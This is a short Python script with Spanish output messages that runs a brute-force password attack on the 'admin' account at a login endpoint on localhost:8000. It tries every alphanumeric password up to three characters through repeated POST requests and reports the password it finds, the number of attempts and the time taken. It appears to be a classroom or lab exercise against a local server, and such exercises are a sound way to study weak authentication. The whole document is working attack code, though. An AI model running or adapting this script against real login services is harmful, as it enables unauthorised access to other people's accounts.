import itertools
import requests
import time

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url = "http://localhost:8000/login"

username = "admin"

def brute_force(longitud_max):

    intentos = 0

    for longitud in range(1, longitud_max + 1):

        print(f"\nLog {longitud}: probando contraseñas de {longitud} caracteres")

        for combo in itertools.product(alphabet, repeat=longitud):

            intentos += 1

            password = "".join(combo)

            response = requests.post(
                url,
                json={
                    "username": username,
                    "password": password
                }
            )

            if response.status_code == 200 and response.json().get("message") == "Login successful":

                return intentos, password, longitud

    return intentos, None, None


print("Iniciando ataque")
print("Usuario:", username)

inicio = time.time()

intentos, password, log_encontrado = brute_force(3)

tiempo = time.time() - inicio


if password:

    print("\nCONTRASEÑA ENCONTRADA")
    print("log:", log_encontrado)
    print("usuario:", username)
    print("password:", password)
    print("intentos:", intentos)
    print("tiempo:", round(tiempo,4),"segundos")

else:

    print("\nNo se encontró la contraseña")
    print("Intentos:", intentos)
